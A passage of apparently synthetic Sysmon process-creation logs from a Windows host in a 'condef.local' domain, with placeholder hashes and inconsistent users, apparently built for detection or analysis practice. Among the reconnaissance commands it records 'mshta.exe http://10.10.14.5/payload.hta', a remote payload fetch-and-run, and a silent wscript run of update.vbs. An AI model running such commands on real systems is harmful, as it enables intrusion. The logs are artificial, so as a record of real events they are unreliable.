      <Data Name="Hashes">SHA1=0000002100000021000000210000002100000021,MD5=00000021000000210000002100000021,SHA256=0000002100000021000000210000002100000021000000210000002100000021,IMPHASH=00000021000000210000002100000021</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0033-000000000c00}</Data>
      <Data Name="ParentProcessId">5033</Data>
      <Data Name="ParentImage">C:\Windows\System32\whoami.exe</Data>
      <Data Name="ParentCommandLine">whoami /groups</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:58.0000000Z" />
      <EventRecordID>5036</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:58.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0034-000000000c00}</Data>
      <Data Name="ProcessId">6034</Data>
      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">whoami.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">whoami.exe</Data>
      <Data Name="CommandLine">whoami /groups</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000002200000022000000220000002200000022,MD5=00000022000000220000002200000022,SHA256=0000002200000022000000220000002200000022000000220000002200000022,IMPHASH=00000022000000220000002200000022</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0034-000000000c00}</Data>
      <Data Name="ParentProcessId">5034</Data>
      <Data Name="ParentImage">C:\Windows\System32\notepad.exe</Data>
      <Data Name="ParentCommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:04:05.0000000Z" />
      <EventRecordID>5037</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:04:05.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0035-000000000c00}</Data>
      <Data Name="ProcessId">6035</Data>
      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">notepad.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">notepad.exe</Data>
      <Data Name="CommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000002300000023000000230000002300000023,MD5=00000023000000230000002300000023,SHA256=0000002300000023000000230000002300000023000000230000002300000023,IMPHASH=00000023000000230000002300000023</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0035-000000000c00}</Data>
      <Data Name="ParentProcessId">5035</Data>
      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:04:12.0000000Z" />
      <EventRecordID>5038</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:04:12.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0036-000000000c00}</Data>
      <Data Name="ProcessId">6036</Data>
      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">svchost.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">svchost.exe</Data>
      <Data Name="CommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000002400000024000000240000002400000024,MD5=00000024000000240000002400000024,SHA256=0000002400000024000000240000002400000024000000240000002400000024,IMPHASH=00000024000000240000002400000024</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0036-000000000c00}</Data>
      <Data Name="ParentProcessId">5036</Data>
      <Data Name="ParentImage">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="ParentCommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:04:19.0000000Z" />
      <EventRecordID>5039</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:04:19.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0037-000000000c00}</Data>
      <Data Name="ProcessId">6037</Data>
      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">rundll32.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">rundll32.exe</Data>
      <Data Name="CommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000002500000025000000250000002500000025,MD5=00000025000000250000002500000025,SHA256=0000002500000025000000250000002500000025000000250000002500000025,IMPHASH=00000025000000250000002500000025</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0037-000000000c00}</Data>
      <Data Name="ParentProcessId">5037</Data>
      <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
      <Data Name="ParentCommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:04:26.0000000Z" />
      <EventRecordID>5040</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:04:26.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0038-000000000c00}</Data>
      <Data Name="ProcessId">6038</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">mshta.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">mshta.exe</Data>
      <Data Name="CommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000002600000026000000260000002600000026,MD5=00000026000000260000002600000026,SHA256=0000002600000026000000260000002600000026000000260000002600000026,IMPHASH=00000026000000260000002600000026</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0038-000000000c00}</Data>
      <Data Name="ParentProcessId">5038</Data>
      <Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
      <Data Name="ParentCommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:04:33.0000000Z" />
      <EventRecordID>5041</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:04:33.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0039-000000000c00}</Data>
      <Data Name="ProcessId">6039</Data>
      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">wscript.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">wscript.exe</Data>
      <Data Name="CommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000002700000027000000270000002700000027,MD5=00000027000000270000002700000027,SHA256=0000002700000027000000270000002700000027000000270000002700000027,IMPHASH=00000027000000270000002700000027</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0039-000000000c00}</Data>
      <Data Name="ParentProcessId">5039</Data>
      <Data Name="ParentImage">C:\Windows\System32\net.exe</Data>
      <Data Name="ParentCommandLine">net user administrator /domain</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:04:40.0000000Z" />
      <EventRecordID>5042</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:04:40.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0040-000000000c00}</Data>
      <Data Name="ProcessId">6040</Data>
      <Data Name="Image">C:\Windows\System32\net.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">net.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">net.exe</Data>
      <Data Name="CommandLine">net user administrator /domain</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000002800000028000000280000002800000028,MD5=00000028000000280000002800000028,SHA256=0000002800000028000000280000002800000028000000280000002800000028,IMPHASH=00000028000000280000002800000028</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0040-000000000c00}</Data>
      <Data Name="ParentProcessId">5040</Data>
      <Data Name="ParentImage">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="ParentCommandLine">ipconfig /all</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:04:47.0000000Z" />
      <EventRecordID>5043</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:04:47.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0041-000000000c00}</Data>
      <Data Name="ProcessId">6041</Data>
      <Data Name="Image">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">ipconfig.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">ipconfig.exe</Data>
      <Data Name="CommandLine">ipconfig /all</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000002900000029000000290000002900000029,MD5=00000029000000290000002900000029,SHA256=0000002900000029000000290000002900000029000000290000002900000029,IMPHASH=00000029000000290000002900000029</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0041-000000000c00}</Data>
      <Data Name="ParentProcessId">5041</Data>
      <Data Name="ParentImage">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="ParentCommandLine">tasklist /v</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  